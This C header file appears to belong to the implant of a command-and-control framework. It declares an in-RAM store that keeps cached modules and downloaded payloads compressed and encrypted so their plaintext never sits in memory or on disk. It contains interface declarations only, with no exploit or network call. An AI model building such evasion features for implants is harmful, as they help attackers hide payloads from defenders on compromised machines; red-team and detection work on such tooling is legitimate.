#ifndef C2_MEMFILE_H
#define C2_MEMFILE_H

/*
 * c2_memfile.h — in-memory file store with transparent compression + encryption.
 *
 * Mirrors the Go agent's memfs: a flat key/value namespace in which every entry
 * is stored gzip-compressed and AES-GCM-encrypted (keyed by the agent's file
 * password), so the process image never holds the plaintext of a cached module
 * or a downloaded payload. Read/write are transparent: callers hand over and
 * receive plaintext; the container is an implementation detail.
 *
 * There is no disk: everything stays in RAM, bounded by `max_bytes` so a
 * hostile or careless upload cannot grow the agent without limit. The store is
 * not thread-safe; the agent's single job loop owns it.
 */

#include "c2_common.h"

#include "c2_crypto.h"

#ifdef __cplusplus
extern "C" {
#endif

#define C2_MEMFILE_PREFIX "memfs:///"
#define C2_MEMFILE_DEFAULT_MAX_BYTES (64u * 1024u * 1024u)

typedef struct {
  char *key;     /* canonical memfs:/// key, NUL-terminated */
  uint8_t *blob; /* gzip-compressed, AES-GCM-encrypted container */
  size_t blob_len;
  size_t plain_len; /* plaintext size, for ls reporting */
} c2_memfile_entry;

typedef struct {
  const c2_crypto_backend *be;
  c2_str password; /* file key; ptr == NULL disables encryption */
  c2_memfile_entry *entries;
  size_t count;
  size_t cap;
  size_t bytes; /* sum of blob_len, the RAM footprint */
  size_t max_bytes;
} c2_memfile;

void c2_memfile_init(c2_memfile *m, const c2_crypto_backend *be,
                     c2_str password, size_t max_bytes);
void c2_memfile_free(c2_memfile *m);

/* Canonical key: "memfs:///" + the basename of `name`. Returns its length. */
size_t c2_memfile_key(const char *name, size_t name_len, char *out, size_t cap);

/* Transparent write: gzip then encrypt, then store (replacing any prior
 * entry). Returns C2_ERR_NOMEM when the byte budget would be exceeded. */
c2_status c2_memfile_write(c2_memfile *m, c2_str key, const uint8_t *data,
                           size_t len);

/* Transparent read: decrypt then gunzip into `out`. */
c2_status c2_memfile_read(const c2_memfile *m, c2_str key, uint8_t *out,
                          size_t out_cap, size_t *out_len);

/* Read into a freshly allocated buffer (caller frees with free()). */
c2_status c2_memfile_read_alloc(const c2_memfile *m, c2_str key, uint8_t **out,
                                size_t *out_len);

int c2_memfile_has(const c2_memfile *m, c2_str key);
c2_status c2_memfile_remove(c2_memfile *m, c2_str key);
size_t c2_memfile_count(const c2_memfile *m);
const char *c2_memfile_key_at(const c2_memfile *m, size_t i);
/* Plaintext size of the i-th entry, for directory listings. */
size_t c2_memfile_plain_len_at(const c2_memfile *m, size_t i);
/* Total on-the-wire (compressed + encrypted) bytes currently held. */
size_t c2_memfile_bytes(const c2_memfile *m);

#ifdef __cplusplus
}
#endif

#endif /* C2_MEMFILE_H */
